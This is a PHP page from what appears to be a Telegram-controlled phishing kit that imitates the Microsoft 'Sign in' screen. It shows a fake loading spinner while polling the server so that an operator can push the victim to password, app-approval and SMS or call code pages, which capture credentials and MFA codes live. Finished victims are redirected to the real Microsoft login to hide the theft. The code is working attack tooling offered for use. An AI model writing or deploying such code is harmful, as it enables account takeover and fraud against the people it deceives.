<?php
// loading.php — Loading screen, Telegram-controlled
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid   = $_SESSION['visitor_id'] ?? session_id();
// ── Block check: redirect immediately if visitor is blocked ──
if (!empty($sid)) {
    $__state = get_state($sid);
    if (!empty($__state['blocked'])) {
        header('Location: blocked.php');
        exit;
    }
}

$state = get_state($sid);
if ($state['page'] === 'success') {
    header('Location: https://login.microsoftonline.com/');
    exit;
}

page_open('Sign in', true);
?>

<div class="card">
  <?= company_logo_html() ?>
  <p style="font-size:16px;font-weight:600;color:#1b1b1b;margin-bottom:4px">Sign in</p>
  <p style="font-size:13px;color:#666;">to continue to Microsoft</p>

  <div style="height:1px;background:#e8e8e8;margin:24px 0"></div>

  <div class="loading-wrap">
    <div class="ms-spinner"></div>
    <p class="loading-title">Please wait...</p>
    <p class="loading-sub">Do not close or refresh this page</p>
  </div>
</div>

<script>
(function(){
  const MAP = {
    'password':     'password.php',
    'pw_error':     'password.php',
    'approve_app':  'approve-app.php',
    'prompt_error': 'approve-app.php',
    'verify_code':  'verify-code.php',
    'text_code':    'text-code.php',
    'call_code':    'call-code.php',
    'code_error':   null, // handled per page
    'blocked':      'blocked.php',
    'success':      'https://login.microsoftonline.com/',
  };
  let redirecting = false;

  function poll() {
    if (redirecting) return;
    fetch('poll.php?t=' + Date.now(), {cache:'no-store'})
      .then(r => r.json())
      .then(d => {
        if (redirecting) return;
        if (d.page === 'loading') return;
        if (d.page === 'success') {
          redirecting = true;
          window.location.replace('https://login.microsoftonline.com/');
          return;
        }
        const dest = MAP[d.page];
        if (dest) { redirecting = true; window.location.replace(dest); }
      }).catch(()=>{});
  }
  setInterval(poll, 1200);
  poll();
})();
</script>

<?php page_close(); ?>